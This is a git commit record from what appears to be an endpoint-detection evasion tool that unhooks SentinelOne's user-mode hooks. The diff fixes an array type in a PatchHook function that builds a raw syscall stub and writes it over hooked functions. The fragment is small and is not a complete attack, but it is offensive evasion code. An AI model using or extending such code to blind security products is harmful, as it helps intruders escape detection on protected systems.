227e6cd86b8517e1c28fee914c14ea9d0f58f98f
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2022-04-19 12:00:56 -0400

    Update unhook_sentinelone_64.c

--- unhook_sentinelone_64.c
+++ unhook_sentinelone_64.c
@@ -19,7 +19,7 @@ VOID PatchHook(CHAR* address, unsigned char id, char high) {
     DWORD dwSize = 11;
     CHAR* patch_address = address;
     //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
-    CHAR* patch[dwSize];
+    CHAR patch[dwSize];
     sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);
 
     DWORD dwOld;
